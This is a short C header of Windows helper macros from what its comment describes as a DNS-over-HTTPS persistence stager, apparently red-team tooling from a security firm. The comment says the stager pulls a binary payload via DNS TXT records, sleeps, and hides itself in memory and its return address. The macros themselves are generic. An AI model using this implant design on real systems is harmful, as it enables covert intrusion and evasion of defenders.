/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _MACROS_H_
#define _MACROS_H_

#define InitializeObjectAttributes(p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES ); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
	}

#define NtCurrentProcess()	((HANDLE)-1)
#define NtCurrentThread()	((HANDLE)-2)

#define D_SEC(x)		__attribute__((section( ".text$" #x "" )))
#define D_API(x)		__typeof__(x) * x
#define U_PTR(x)		((ULONG_PTR)x)
#define C_PTR(x)		((PVOID)x)

#endif
